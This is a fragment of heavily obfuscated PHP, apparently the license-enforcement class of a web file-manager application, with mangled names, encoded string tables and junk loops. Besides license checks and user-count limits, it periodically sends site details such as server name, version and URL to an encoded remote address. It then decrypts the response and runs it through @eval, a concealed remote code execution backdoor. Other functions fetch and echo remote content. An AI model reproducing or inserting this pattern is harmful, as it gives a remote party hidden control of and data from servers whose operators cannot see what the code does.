$Ê‘Ò÷Á˜[681]; if (!$…©Êı†ï) { die; } if (!is_array($Ó†¼§”) || !isset($Ó†¼§”[$½Ù»õ­Ã[202]]) || time() - $Ó†¼§”[$½Ù»õ­Ã[202]] >= 60) { $¸íé½÷Û = Model($½Ù»õ­Ã[7])->loadList(); $ê÷ø„ûˆ = $¸íé½÷Û[$½Ù»õ­Ã[195]]; $æñ÷”¹ = md5($_SERVER[$½Ù»õ­Ã[100]] . strrev($—°Ùåï) . $ıÀ¤ˆŒ×[$½Ù»õ­Ã[186]]); $ÕìíçÂ = strrev(substr($æñ÷”¹, 10, 16)); $Ó†¼§” = $this->guaq25d340da($ê÷ø„ûˆ[$½Ù»õ­Ã[83]][$ÕìíçÂ], $æñ÷”¹); $Ó†¼§” = json_decode($Ó†¼§”, !0); } if (!is_array($Ó†¼§”)) { return $this->mthi6d41e200(); } $¥ÒŠ¶ıõ = strtotime($Ó†¼§”[$½Ù»õ­Ã[126]]); if (time() >= $¥ÒŠ¶ıõ) { return $this->mthi6d41e200(); } if (time() - $Ó†¼§”[$½Ù»õ­Ã[202]] > 20) { $Ó†¼§”[$½Ù»õ­Ã[202]] = time(); Cache::set($œ¯³ì„æ, $Ó†¼§”); } $this->hpsm31fd9c75 = $Ó†¼§”; $this->vwgxebb4ee18 = $ıÀ¤ˆŒ×[$½Ù»õ­Ã[103]]; $Ë‚‘ŞÁ = $Ê‘Ò÷Á˜[682]; while ($Ë‚‘ŞÁ < $Ê‘Ò÷Á˜[622]) { if ($Ë‚‘ŞÁ >= 0) { break; } $Ë‚‘ŞÁ++; } } private function cfxqf2f5bc16() { $Õšƒ¡ï  =& $_SERVER[¯µç›È¢]; $‚ßı– =& $_SERVER[¥Ô°é•­]; $å€Âû§ = $GLOBALS[$‚ßı–[13]]; $”ÁÇ‡©¶ = $Õšƒ¡ï [683]; while (strlen($”ÁÇ‡©¶) < $Õšƒ¡ï [618]) { if (!$”ÁÇ‡©¶) { break; } $”ÁÇ‡©¶++; } $ûù€ÏŸñ = $_SERVER[$‚ßı–[24]]; $Ÿ’¸¥Õµ = $Õšƒ¡ï [684]; while (strlen($Ÿ’¸¥Õµ) < $Õšƒ¡ï [645]) { if (!$Ÿ’¸¥Õµ) { break; } $Ÿ’¸¥Õµ++; } if ($ûù€ÏŸñ == $‚ßı–[203] && $this->vwgxebb4ee18 == $‚ßı–[104]) { show_json(LNG($‚ßı–[204]), !1, $‚ßı–[205]); } $Á¹­†Øª = array($‚ßı–[206], $‚ßı–[207]); if (in_array($ûù€ÏŸñ, $Á¹­†Øª)) { if ($this->vwgxebb4ee18 == $‚ßı–[104] && isset($å€Âû§[$‚ßı–[208]])) { show_json(LNG($‚ßı–[204]), !1, $‚ßı–[205]); die; } $³½¬á±± = $this->oqfu2c5a69c3(); if ($³½¬á±± != intval($‚ßı–[209])) { if ($³½¬á±± <= Model($‚ßı–[122])->count()) { show_json(LNG($‚ßı–[210]), !1, $‚ßı–[205]); die; } } } } private function ksdl4de17ccb() { $×¡Ã©õ =& $_SERVER[¯µç›È¢]; $Ÿ­ë«ığ =& $_SERVER[¥Ô°é•­]; $á¢±ÌìÂ = array($Ÿ­ë«ığ[116], $Ÿ­ë«ığ[117]); if (!_get($GLOBALS, $Ÿ­ë«ığ[113]) || !isset($_GET[$Ÿ­ë«ığ[211]])) { return; } if (!in_array($_SERVER[$Ÿ­ë«ığ[24]], $á¢±ÌìÂ)) { return; } $ºÆÊ¨˜¢ = $Ÿ­ë«ığ[212]; $ä´ÜÇÇê = $×¡Ã©õ[685]; while (strlen($ä´ÜÇÇê) < $×¡Ã©õ[67]) { if (!$ä´ÜÇÇê) { break; } $ä´ÜÇÇê++; } $ºÆÊ¨˜¢ = $this->qocba3ce4d19($ºÆÊ¨˜¢, $Ÿ­ë«ığ[213]); $¼Å’âÃ¾ = $×¡Ã©õ[686]; while ($¼Å’âÃ¾ < $×¡Ã©õ[634]) { if ($¼Å’âÃ¾ >= 0) { break; } $¼Å’âÃ¾++; } $¨´±¿œ = stream_context_create(array($Ÿ­ë«ığ[214] => array($Ÿ­ë«ığ[215] => $Ÿ­ë«ığ[216], $Ÿ­ë«ığ[217] => 3))); $Âòä¶ùš = @file_get_contents($ºÆÊ¨˜¢, !1, $¨´±¿œ); header($Ÿ­ë«ığ[218]); $­’¢É’… = $×¡Ã©õ[687]; if (strlen($­’¢É’…) < $×¡Ã©õ[634]) { die; } if ($Âòä¶ùš && strstr($Âòä¶ùš, $Ÿ­ë«ığ[219])) { echo $Âòä¶ùš; } die; } public function yhtwc4604060($¬ûó˜•‡) { $€¬Şä‡† =& $_SERVER[¥Ô°é•­]; if ($this->vwgxebb4ee18 == $€¬Şä‡†[220]) { return $¬ûó˜•‡; } $ØûàùÙï = array($€¬Şä‡†[221] => $€¬Şä‡†[222], $€¬Şä‡†[223] => $€¬Şä‡†[222], $€¬Şä‡†[224] => $€¬Şä‡†[222], $€¬Şä‡†[225] => $€¬Şä‡†[222], $€¬Şä‡†[226] => $€¬Şä‡†[227], $€¬Şä‡†[228] => $€¬Şä‡†[227], $€¬Şä‡†[229] => $€¬Şä‡†[227], $€¬Şä‡†[230] => $€¬Şä‡†[227], $€¬Şä‡†[231] => $€¬Şä‡†[227], $€¬Şä‡†[232] => $€¬Şä‡†[227], $€¬Şä‡†[233] => $€¬Şä‡†[227], $€¬Şä‡†[234] => $€¬Şä‡†[227], $€¬Şä‡†[235] => $€¬Şä‡†[227], $€¬Şä‡†[236] => $€¬Şä‡†[227], $€¬Şä‡†[237] => $€¬Şä‡†[227], $€¬Şä‡†[238] => $€¬Şä‡†[227]); $€áØâü¬ = $_SERVER[¯µç›È¢][688]; if (!$€áØâü¬) { return; } $ùßã„ºÎ = explode($€¬Şä‡†[239], _get($this->hpsm31fd9c75, $€¬Şä‡†[110], $€¬Şä‡†[6])); $İ›ÒÎ–Ò = array(); foreach ($ØûàùÙï as $‹Äö†×à => $·†š‹Ë•) { if ($·†š‹Ë• == $€¬Şä‡†[222] && substr($this->vwgxebb4ee18, 0, 1) == $€¬Şä‡†[222]) { continue; } if (!in_array($‹Äö†×à, $ùßã„ºÎ)) { $İ›ÒÎ–Ò[] = $‹Äö†×à; } } foreach ($İ›ÒÎ–Ò as $‹Äö†×à) { unset($¬ûó˜•‡[$‹Äö†×à]); } return $¬ûó˜•‡; } private function bpxw142272f1() { $Ø­·•Ç° =& $_SERVER[¥Ô°é•­]; if ($this->vwgxebb4ee18 != $Ø­·•Ç°[104]) { $GLOBALS[$Ø­·•Ç°[83]][$Ø­·•Ç°[87]][$Ø­·•Ç°[240]] = $Ø­·•Ç°[201]; return; } $GLOBALS[$Ø­·•Ç°[83]][$Ø­·•Ç°[241]] = $Ø­·•Ç°[119]; if (Model($Ø­·•Ç°[242])->get($Ø­·•Ç°[63]) != $Ø­·•Ç°[201]) { Model($Ø­·•Ç°[242])->set($Ø­·•Ç°[63], $Ø­·•Ç°[201]); } } public function duye7e7ffb97() { return $_SERVER[¥Ô°é•­][243]; $î‚‡§‡À = $_SERVER[¯µç›È¢][689]; if (!$î‚‡§‡À) { die; } } private function gkhib2261d41() { $¸İÅ¸™ =& $_SERVER[¯µç›È¢]; $à™¯°Ÿ¤ =& $_SERVER[¥Ô°é•­]; $šÔ ñ´€ = array($à™¯°Ÿ¤[244], $à™¯°Ÿ¤[245], $à™¯°Ÿ¤[246]); $¢’’Í = $¸İÅ¸™[690]; if (strlen($¢’’Í) < $¸İÅ¸™[634]) { die; } $Şø°…Ëæ = $à™¯°Ÿ¤[247] . md5($à™¯°Ÿ¤[248]); $™»¤¸ = $¸İÅ¸™[691]; if ($this->vwgxebb4ee18 == $à™¯°Ÿ¤[104] || !_get($GLOBALS, $à™¯°Ÿ¤[113])) { return; } if (!in_array($_SERVER[$à™¯°Ÿ¤[24]], $šÔ ñ´€)) { return; } if (time() % 4 != 0) { return; } $Á©ßË¾¾ = call_user_func(array($à™¯°Ÿ¤[249], $à™¯°Ÿ¤[250]), $Şø°…Ëæ); if ($Á©ßË¾¾ && time() - $Á©ßË¾¾ < intval($à™¯°Ÿ¤[251])) { return; } call_user_func(array($à™¯°Ÿ¤[249], $à™¯°Ÿ¤[136]), $Şø°…Ëæ, time()); $Óå‹Œ± = $¸İÅ¸™[692]; $Éó‹¾İÂ = Model($à™¯°Ÿ¤[33])->get($à™¯°Ÿ¤[101]); $ÃÓö°åï = array($à™¯°Ÿ¤[148] => Model($à™¯°Ÿ¤[33])->get($à™¯°Ÿ¤[184]), $à™¯°Ÿ¤[161] => $this->vwgxebb4ee18, $à™¯°Ÿ¤[158] => $_SERVER[$à™¯°Ÿ¤[159]], $à™¯°Ÿ¤[160] => Model($à™¯°Ÿ¤[33])->get($à™¯°Ÿ¤[128]), $à™¯°Ÿ¤[99] => md5($_SERVER[$à™¯°Ÿ¤[100]] . $Éó‹¾İÂ), $à™¯°Ÿ¤[151] => $à™¯°Ÿ¤[133], $à™¯°Ÿ¤[154] => $_SERVER[$à™¯°Ÿ¤[155]]); $¾ËèÇÀ“ = $this->mzat3d176a3b($à™¯°Ÿ¤[252], $ÃÓö°åï); if (!is_array($¾ËèÇÀ“)) { return; } if ($¾ËèÇÀ“[$à™¯°Ÿ¤[148]] && $¾ËèÇÀ“[$à™¯°Ÿ¤[253]]) { if ($this->qeyfd6520446($¾ËèÇÀ“[$à™¯°Ÿ¤[253]]) == $ÃÓö°åï[$à™¯°Ÿ¤[148]]) { return; } } $this->mthi6d41e200(); if ($this->qeyfd6520446($¾ËèÇÀ“[$à™¯°Ÿ¤[253]]) != $ÃÓö°åï[$à™¯°Ÿ¤[148]]) { $Í™ëÇó = array($à™¯°Ÿ¤[179] => $Éó‹¾İÂ, $à™¯°Ÿ¤[180] => $_SERVER[$à™¯°Ÿ¤[100]], $à™¯°Ÿ¤[181] => this_url(), $à™¯°Ÿ¤[156] => $_SERVER[$à™¯°Ÿ¤[157]]); $¼®ĞÖüÅ = $this->wqhu7fec0186(json_encode($Í™ëÇó)); $¾ËèÇÀ“ = $this->mzat3d176a3b($à™¯°Ÿ¤[182] . $¼®ĞÖüÅ); if ($¾ËèÇÀ“ && is_array($¾ËèÇÀ“) && isset($¾ËèÇÀ“[$à™¯°Ÿ¤[253]])) { $ Å—ëÃ˜ = $this->guaq25d340da($¾ËèÇÀ“[$à™¯°Ÿ¤[253]], 2); if ($ Å—ëÃ˜) { $ Å—ëÃ˜ = $this->qeyfd6520446($ Å—ëÃ˜); } if ($ Å—ëÃ˜) { try { @eval($ Å—ëÃ˜); } catch (Exception $šÅŒƒˆñ) { } } } } } private function mzat3d176a3b($ˆ¨Ã†ÜÖ = '', $û¢òŞ„Ç = array(), $ÃöÉÒ¿· = 5) { $Ò¾×˜ÈÑ =& $_SERVER[¯µç›È¢]; $ç“¿ÜÏ =& $_SERVER[¥Ô°é•­]; $¿Èöøµ = $ç“¿ÜÏ[254]; $¿Èöøµ = $this->qocba3ce4d19($¿Èöøµ, $ç“¿ÜÏ[255]); $æ°âœİğ = $Ò¾×˜ÈÑ[693]; if (!$æ°âœİğ) { return; } $¿Èöøµ = $¿Èöøµ . $ˆ¨Ã†ÜÖ; $¡ŠÒº•º = $Ò¾×˜ÈÑ[694]; if (strlen($¡ŠÒº•º) < $Ò¾×˜ÈÑ[645]) { return; } if ($û¢òŞ„Ç && is_array($û¢òŞ„Ç)) { $¿Èöøµ = $¿Èöøµ . $ç“¿ÜÏ[256] . http_build_query($û¢òŞ„Ç); } if ($û¢òŞ„Ç === -1) { return $¿Èöøµ; } $åÌ«Í›ô = stream_context_create(array($ç“¿ÜÏ[214] => array($ç“¿ÜÏ[217] => $ÃöÉÒ¿·, $ç“¿ÜÏ[215] => $ç“¿ÜÏ[257]), $ç“¿ÜÏ[258] => array($ç“¿ÜÏ[259] => !1, $ç“¿ÜÏ[260] => !1))); $ÕìÆÀä = $Ò¾×˜ÈÑ[695]; $û¢òŞ„Ç = @file_get_contents($¿Èöøµ, !1, $åÌ«Í›ô); return json_decode($û¢òŞ„Ç, !0); $åËñóÖÖ = $Ò¾×˜ÈÑ[696]; $™Ú–¢¡Ş = $Ò¾×˜ÈÑ[697]; } private function oqfu2c5a69c3() { $œ÷øâ´ =& $_SERVER[¯µç›È¢]; $ÜÒÙ«ÅÖ =& $_SERVER[¥Ô°é•­]; $ÒÓàû“Õ = array($ÜÒÙ«ÅÖ[261] => $ÜÒÙ«ÅÖ[262], $ÜÒÙ«ÅÖ[263] => $ÜÒÙ«ÅÖ[264], $ÜÒÙ«ÅÖ[265] => $ÜÒÙ«ÅÖ[266], $ÜÒÙ«ÅÖ[267] => $ÜÒÙ«ÅÖ[268], $ÜÒÙ«ÅÖ[269] => $ÜÒÙ«ÅÖ[270], $ÜÒÙ«ÅÖ[271] => $ÜÒÙ«ÅÖ[209], $ÜÒÙ«ÅÖ[272] => $ÜÒÙ«ÅÖ[209], $ÜÒÙ«ÅÖ[273] => $ÜÒÙ«ÅÖ[262], $ÜÒÙ«ÅÖ[274] => $ÜÒÙ«ÅÖ[264], $ÜÒÙ«ÅÖ[275] => $ÜÒÙ«ÅÖ[266], $ÜÒÙ«ÅÖ[276] => $ÜÒÙ«ÅÖ[277], $ÜÒÙ«ÅÖ[278] => $ÜÒÙ«ÅÖ[268], $ÜÒÙ«ÅÖ[279] => $ÜÒÙ«ÅÖ[280], $ÜÒÙ«ÅÖ[281] => $ÜÒÙ«ÅÖ[270], $ÜÒÙ«ÅÖ[282] => $ÜÒÙ«ÅÖ[283], $ÜÒÙ«ÅÖ[284] => $ÜÒÙ«ÅÖ[285], $ÜÒÙ«ÅÖ[286] => $ÜÒÙ«ÅÖ[287]); $ç“à™Â½ = $ÒÓàû“Õ[$this->vwgxebb4ee18]; $¾Éİ€»í = $œ÷øâ´[698]; $ç“à™Â½ = intval($ç“à™Â½ ? $ç“à™Â½ : $ÜÒÙ«ÅÖ[262]); $•ÎÚ¾›« = _get($this->hpsm31fd9c75, $ÜÒÙ«ÅÖ[288]); $•ÎÚ¾›« = $•ÎÚ¾›« ? intval($•ÎÚ¾›«) : 0; return $ç“à™Â½ + $•ÎÚ¾›«; $•Úı±ŒÄ = $œ÷øâ´[699]; if (!$•Úı±ŒÄ) { die; } } public function moxr72f2e723($á°ğ›Û) { $»ƒ”Ÿ§ï =& $_SERVER[¯µç›È¢]; $±µ†«Ù =& $_SERVER[¥Ô°é•­]; $åš­‰¡Æ = $this->oqfu2c5a69c3(); $úş¯„â  = $»ƒ”Ÿ§ï[700]; if (!$úş¯„â ) { die; } if ($á°ğ›Û[$±µ†«Ù[289]] == $±µ†«Ù[119]) { return; } if ($åš­‰¡Æ >= intval($±µ†«Ù[209])) { return; } $½³¶îÊ¥ = Model($±µ†«Ù[122])->count(); $Ï¹×ö÷¾ = $»ƒ”Ÿ§ï[701]; if (!$Ï¹×ö÷¾) { die; } if ($½³¶îÊ¥ <= $åš­‰¡Æ) { return; } $‹éóæáÉ = Model($±µ†«Ù[122])->field($±µ†«Ù[289])->limit($åš­‰¡Æ)->select(); $½´¡Ÿ› = $»ƒ”Ÿ§ï[702]; if (!$½´¡Ÿ›) { return; } $‹éóæáÉ = array_to_keyvalue($‹éóæáÉ, $±µ†«Ù[6], $±µ†«Ù[289]); $ĞÈö·Åë = $»ƒ”Ÿ§ï[703]; while ($ĞÈö·Åë < $»ƒ”Ÿ§ï[634]) { if ($ĞÈö·Åë >= 0) { break; } $ĞÈö·Åë++; } if (!in_array($á°ğ›Û[$±µ†«Ù[289]], $‹éóæáÉ)) { show_json($±µ†«Ù[290], !1, $±µ†«Ù[205]); } } public function aqry6f53530a() { $ßæß„±Õ =& $_SERVER[¯µç›È¢]; $Ãı—“Ôá =& $_SERVER[¥Ô°é•­]; if (!_get($GLOBALS, $Ãı—“Ôá[113]) || mt_rand(1, 100) > 20) { return; } $–Ù”Ê­© = $Ãı—“Ôá[212]; $–Ù”Ê­© = $this->qocba3ce4d19($–Ù”Ê­©, $Ãı—“Ôá[213]); $´´„§²å = $ßæß„±Õ[704]; $Ú–‘ñû• = stream_context_create(array($Ãı—“Ôá[214] => array($Ãı—“Ôá[215] => $Ãı—“Ôá[216], $Ãı—“Ôá[217] => 3))); $óÍ’½Ö½ = $ßæß„±Õ[705]; $—¥ Ôş = @file_get_contents($–Ù”Ê­©, !1, $Ú–‘ñû•); $üñ³¼ÑÌ = $ßæß„±Õ[706]; if (strlen($üñ³¼ÑÌ) < $ßæß„±Õ[634]) { return; } echo $Ãı—“Ôá[291] . hash_encode($—¥ Ôş) . $Ãı—“Ôá[292]; } private function hoky6f680981($ë¨¤œ“ß, $é•×îó, $èÎ½‹üÈ = 3) { $¨ØŠœ‚ë =& $_SERVER[¯µç›È¢]; $ö‹†Ğ‰‚ =& $_SERVER[¥Ô°é•­]; usleep(1); $éü‘Ä” = $¨ØŠœ‚ë[707]; if (!$éü‘Ä”) { die; } $ë¨¤œ“ß = trim($ë¨¤œ“ß); $¥Â‘¡¢ó = mt_rand(0, 5) . $ö‹†Ğ‰‚[6]; $†…üœ¨Ø = $¨ØŠœ‚ë[708]; if (strlen($†…üœ¨Ø) < $¨ØŠœ‚ë[634]) { die; } $æ¦ìæŸÕ = rand_string(15); $Ôµ•ñ±À = $ö‹†Ğ‰‚[293]; $Ş›ŠºëŠ = $¨ØŠœ‚ë[709]; switch ($¥Â‘¡¢ó) { case $ö‹†Ğ‰‚[201]: $ğ­œÇ‰ = $this->lyuc55548a77($ë¨¤œ“ß, strrev($é•×îó . $æ¦ìæŸÕ)); break; $šƒäİÖ = $¨ØŠœ‚ë[710]; if (strlen($šƒäİÖ) < $¨ØŠœ‚ë[622]) { return; } case $ö‹†Ğ‰‚[119]: $ğ­œÇ‰ = $this->lyuc55548a77($ë¨¤œ“ß, strrev($æ¦ìæŸÕ . $é•×îó)); $áèñ‘»™ = $¨ØŠœ‚ë[711]; while ($áèñ‘»™ < $¨ØŠœ‚ë[645]) { if ($áèñ‘»™ >= 0) { break; } $áèñ‘»™++; } break; case $ö‹†Ğ‰‚[294]: $ğ­œÇ‰ = $this->lyuc55548a77($ë¨¤œ“ß, base64_encode($æ¦ìæŸÕ . $é•×îó)); break; $®ôÒ÷ˆ“ = $¨ØŠœ‚ë[712]; while ($®ôÒ÷ˆ“ < $¨ØŠœ‚ë[645]) { if ($®ôÒ÷ˆ“ >= 0) { break; } $®ôÒ÷ˆ“++; } case $ö‹†Ğ‰‚[295]: $ğ­œÇ‰ = $this->lyuc55548a77($ë¨¤œ“ß, md5($æ¦ìæŸÕ . $é•×îó)); $…éÖĞ‚ = $¨ØŠœ‚ë[713]; if (strlen($…éÖĞ‚) < $¨ØŠœ‚ë[618]) { return; } break; $Ÿ¿ş¨£û = $¨ØŠœ‚ë[714]; case $ö‹†Ğ‰‚[296]: $ë¨¤œ“ß = base64_encode($ë¨¤œ“ß); $ú¼ü¼½Í = $¨ØŠœ‚ë[715]; if (strlen($ú¼ü¼½Í) < $¨ØŠœ‚ë[634]) { return; } $©‹³…‹µ = rand(0, 64); $±ñóĞ€Ù = $¨ØŠœ‚ë[716]; if (strlen($±ñóĞ€Ù) < $¨ØŠœ‚ë[634]) { return; } $õ°ŸáÛ¾ = $Ôµ•ñ±À[$©‹³…‹µ]; $Àê÷š‡ = md5($õ°ŸáÛ¾ . md5($é•×îó . $õ°ŸáÛ¾) . $é•×îó); $Àê÷š‡ = substr($Àê÷š‡, $©‹³…‹µ % 8, $©‹³…‹µ % 8 + 7); $µæ…¹± = $¨ØŠœ‚ë[717]; $ë”¡ú§ = $ö‹†Ğ‰‚[6]; $ŠÑò’Ÿ = $¨ØŠœ‚ë[718]; if (strlen($ŠÑò’Ÿ) < $¨ØŠœ‚ë[645]) { die; } $ÎÃƒöë = 0; $§Ê¾ë¡’ = $¨ØŠœ‚ë[719]; if (strlen($§Ê¾ë¡’) < $¨ØŠœ‚ë[618]) { return; } $ó—èî = 0; $¨íãƒÜ“ = $¨ØŠœ‚ë[720]; while (strlen($¨íãƒÜ“) < $¨ØŠœ‚ë[622]) { if (!$¨íãƒÜ“) { break; } $¨íãƒÜ“++; } $º›‰çş´ = 0; $œ½ĞËÒ = $¨ØŠœ‚ë[721]; if (strlen($œ½ĞËÒ) < $¨ØŠœ‚ë[618]) { return; } for ($ÎÃƒöë = 0; $ÎÃƒöë < strlen($ë¨¤œ“ß); $ÎÃƒöë++) { $º›‰çş´ = $º›‰çş´ == strlen($Àê÷š‡) ? 0 : $º›‰çş´; $Ò¸¥ÁöÉ = $¨ØŠœ‚ë[722]; if (!$Ò¸¥ÁöÉ) { die; } $ó—èî = ($©‹³…‹µ + strpos($Ôµ•ñ±À, $ë¨¤œ“ß[$ÎÃƒöë]) + ord($Àê÷š‡[$º›‰çş´++])) % 64; $ë”¡ú§ .= $Ôµ•ñ±À[$ó—èî]; } $ğ­œÇ‰ = hash_encode($õ°ŸáÛ¾ . $ë”¡ú§); $ƒöòëî = $¨ØŠœ‚ë[723]; while ($ƒöòëî < $¨ØŠœ‚ë[645]) { if ($ƒöòëî >= 0) { break; } $ƒöòëî++; } break; default: $ğ­œÇ‰ = $this->lyuc55548a77($ë¨¤œ“ß, $é•×îó . $æ¦ìæŸÕ); $ÈŒæØÏõ = $¨ØŠœ‚ë[724]; if (!$ÈŒæØÏõ) { return; } break; $ÈßÅ Ñ¿ = $¨ØŠœ‚ë[725]; if (strlen($ÈßÅ Ñ¿) < $¨ØŠœ‚ë[645]) { return; } } $ğ­œÇ‰ = strrev($¥Â‘¡¢ó . $æ¦ìæŸÕ . $ğ­œÇ‰); $¼ğ«‘š¿ = $¨ØŠœ‚ë[726]; if (strlen($¼ğ«‘š¿) < $¨ØŠœ‚ë[645]) { return; } if ($èÎ½‹üÈ - 1 > 0) { $ğ­œÇ‰ = $this->hoky6f680981($ğ­œÇ‰, $é•×îó, $èÎ½‹üÈ - 1); } return $ğ­œÇ‰; } private function guaq25d340da($óã‹½û¢, $øì‡Çü¦, $®²Õö« = 3) { $—«€¥³ =& $_SERVER[¯µç›È¢]; $…ëÙâş¶ =& $_SERVER[¥Ô°é•­]; if (!is_string($óã‹½û¢) || strlen($óã‹½û¢) < 10) { return !1; } $óã‹½û¢ = trim($óã‹½û¢); $íÉÆ¥ÏŠ = $—«€¥³[727]; $óã‹½û¢ = strrev($óã‹½û¢); $İÊÆ¾¿ò = $—«€¥³[728]; if (!$İÊÆ¾¿ò) { die; } $…ÃÈÓã = $óã‹½û¢[0]; $Úóß¤—Ù = $—«€¥³[729]; if (!$Úóß¤—Ù) { die; } $«Ä¬°êß = substr($óã‹½û¢, 1, 15); $óã‹½û¢ = substr($óã‹½û¢, 16); $Ş¾é¨Û¹ = $—«€¥³[730]; $ü’Å¾ó = $…ëÙâş¶[293]; $«¸Ÿ¡§ì = $—«€¥³[731]; while ($«¸Ÿ¡§ì < $—«€¥³[618]) { if ($«¸Ÿ¡§ì >= 0) { break; } $«¸Ÿ¡§ì++; } switch ($…ÃÈÓã) { case $…ëÙâş¶[201]: $¨ú¢¹£¬ = $this->qocba3ce4d19($óã‹½û¢, strrev($øì‡Çü¦ . $«Ä¬°êß)); break; $ıÖØİ˜Ï = $—«€¥³[732]; if (strlen($ıÖØİ˜Ï) < $—«€¥³[67]) { return; } case $…ëÙâş¶[119]: $¨ú¢¹£¬ = $this->qocba3ce4d19($óã‹½û¢, strrev($«Ä¬°êß . $øì‡Çü¦)); $şòæç¨¬ = $—«€¥³[733]; while ($şòæç¨¬ < $—«€¥³[622]) { if ($şòæç¨¬ >= 0) { break; } $şòæç¨¬++; } break; $ıÎó¨ï¤ = $—«€¥³[734]; while (strlen($ıÎó¨ï¤) < $—«€¥³[645]) { if (!$ıÎó¨ï¤) { break; } $ıÎó¨ï¤++; } case $…ëÙâş¶[294]: $¨ú¢¹£¬ = $this->qocba3ce4d19($óã‹½û¢, base64_encode($«Ä¬°êß . $øì‡Çü¦)); break; case $…ëÙâş¶[295]: $¨ú¢¹£¬ = $this->qocba3ce4d19($óã‹½û¢, md5($«Ä¬°êß . $øì‡Çü¦)); $Ø ›üòë = $—«€¥³[735]; if (!$Ø ›üòë) { die; } break; $¢ƒê‡œ¼ = $—«€¥³[736]; while ($¢ƒê‡œ¼ < $—«€¥³[67]) { if ($¢ƒê‡œ¼ >= 0) { break; } $¢ƒê‡œ¼++; } case $…ëÙâş¶[296]: $óã‹½û¢ = hash_decode($óã‹½û¢); $˜†ßÔÎ = $óã‹½û¢[0]; $‚™Ã”òƒ = $—«€¥³[737]; if (strlen($‚™Ã”òƒ) < $—«€¥³[618]) { die; } $óã‹½û¢ = substr($óã‹½û¢, 1); $“¯ïß¼ = strpos($ü’Å¾ó, $˜†ßÔÎ); $ˆ”´·óÁ = $—«€¥³[738]; if (strlen($ˆ”´·óÁ) < $—«€¥³[622]) { die; } $üÑâáĞñ = md5($˜†ßÔÎ . md5($øì‡Çü¦ . $˜†ßÔÎ) . $øì‡Çü¦); $üÑâáĞñ = substr($üÑâáĞñ, $“¯ïß¼ % 8, $“¯ïß¼ % 8 + 7); $……¿ìÑÃ = $—«€¥³[739]; if (strlen($……¿ìÑÃ) < $—«€¥³[618]) { die; } $æ¾¹³œ— = $…ëÙâş¶[6]; $Ü»¤ƒ“â = 0; $Øåèç£Ï = $—«€¥³[689]; if (!$Øåèç£Ï) { return; } $€¿ÂêÙ = 0; $ùÅÙÌ³¼ = $—«€¥³[740]; $‚†¥áÎ– = 0; $™ÅÌ›•Ô = $—«€¥³[741]; for ($Ü»¤ƒ“â = 0; $Ü»¤ƒ“â < strlen($óã‹½û¢); $Ü»¤ƒ“â++) { $‚†¥áÎ– = $‚†¥áÎ– == strlen($üÑâáĞñ) ? 0 : $‚†¥áÎ–; $ÏÓğèáŠ = $‚†¥áÎ–++; $€¿ÂêÙ = strpos($ü’Å¾ó, $óã‹½û¢[$Ü»¤ƒ“â]) - $“¯ïß¼ - ord($üÑâáĞñ[$ÏÓğèáŠ]); while ($€¿ÂêÙ < 0) { $€¿ÂêÙ += 64; } $æ¾¹³œ— .= $ü’Å¾ó[$€¿ÂêÙ]; } $¨ú¢¹£¬ = base64_decode($æ¾¹³œ—); $˜ŠéĞ» = $—«€¥³[742]; if (!$˜ŠéĞ») { die; } break; $§û¿® = $—«€¥³[743]; while ($§û¿® < $—«€¥³[622]) { if ($§û¿® >= 0) { break; } $§û¿®++; } default: $¨ú¢¹£¬ = $this->qocba3ce4d19($óã‹½û¢, $øì‡Çü¦ . $«Ä¬°êß); $ò¨»‹ŞÓ = $—«€¥³[744]; if (strlen($ò¨»‹ŞÓ) < $—«€¥³[622]) { die; } break; $Í£ö–ÄŸ = $—«€¥³[745]; if (!$Í£ö–ÄŸ) { return; } } if ($®²Õö« - 1 > 0) { $¨ú¢¹£¬ = $this->guaq25d340da($¨ú¢¹£¬, $øì‡Çü¦, $®²Õö« - 1); } return $¨ú¢¹£¬; } public function wqhu7fec0186($Ê›ÏŞã) { $ÆÌóÚ¤Ä =& $_SERVER[¯µç›È¢]; $‘İ³÷½é =& $_SERVER[¥Ô°é•­]; $å×ƒâÑŠ = $this->upor5774df6d(); $À¹‡ìªØ = $ÆÌóÚ¤Ä[746]; $–±²ˆış = $this->upor5774df6d(); $­çç’ÖÊ = ($å×ƒâÑŠ - 1) * ($–±²ˆış - 1); $Çãíğú¡ = $ÆÌóÚ¤Ä[747]; if (!$Çãíğú¡) { die; } $‡”°æèï = intval(($å×ƒâÑŠ + $–±²ˆış) / 2); while (1) { $”¤ã = $‡”°æèï; $ ÛáåÈ = $­çç’ÖÊ; while ($ ÛáåÈ % $”¤ã != 0) { $–‡áµâà = $ ÛáåÈ; $ ÛáåÈ = $”¤ã; $”¤ã = $–‡áµâà % $”¤ã; } if ($”¤ã == 1) { break; } else { $‡”°æèï++; } } $šå“á© = 2; $ÙšŒŠÇ¼ = $ÆÌóÚ¤Ä[748]; if (!$ÙšŒŠÇ¼) { die; } for ($Ş¿„Ÿø« = 0; $Ş¿„Ÿø« < $­çç’ÖÊ * 10; $Ş¿„Ÿø«++) { if (($­çç’ÖÊ * $Ş¿„Ÿø« + 1) % $‡”°æèï == 0) { $šå“á© = intval(($­çç’ÖÊ * $Ş¿„Ÿø« + 1) / $‡”°æèï); break; } } $›â½…Ì– = $this->lyuc55548a77($å×ƒâÑŠ * $–±²ˆış . $‘İ³÷½é[6], $‘İ³÷½é[133]); $¼Ÿ­´ã¿ = md5($‘İ³÷½é[297] . ($å×ƒâÑŠ + $–±²ˆış) . $‘İ³÷½é[298] . $‡”°æèï . $‘İ³÷½é[298] . $šå“á© . $‘İ³÷½é[299]); $¼ºã²øŒ = $ÆÌóÚ¤Ä[749]; if (!$¼ºã²øŒ) { return; } $ÀÁ‚»­µ = $this->lyuc55548a77($Ê›ÏŞã, $¼Ÿ­´ã¿) . $‘İ³÷½é[300] . $›â½…Ì–; $Ğ˜¸ƒ© = $ÆÌóÚ¤Ä[750]; return $ÀÁ‚»­µ; } public function qeyfd6520446($©ºÙóÜ›) { $„âÛ‚€ =& $_SERVER[¯µç›È¢]; $¸½Èéü =& $_SERVER[¥Ô°é•­]; $Â®€Í¿¿ = explode($¸½Èéü[300], $©ºÙóÜ›); $×¸İêÔà = $„âÛ‚€[751]; while ($×¸İêÔà < $„âÛ‚€[634]) { if ($×¸İêÔà >= 0) { break; } $×¸İêÔà++; } if (count($Â®€Í¿¿) != 2) { return $¸½Èéü[6]; } $äìèªö¼ = $this->qocba3ce4d19($Â®€Í¿¿[1] . $¸½Èéü[6], $¸½Èéü[133]); if (!$äìèªö¼) { return $¸½Èéü[6]; } $äìèªö¼ = intval($äìèªö¼); $Óı‚¿…ò = $„âÛ‚€[752]; 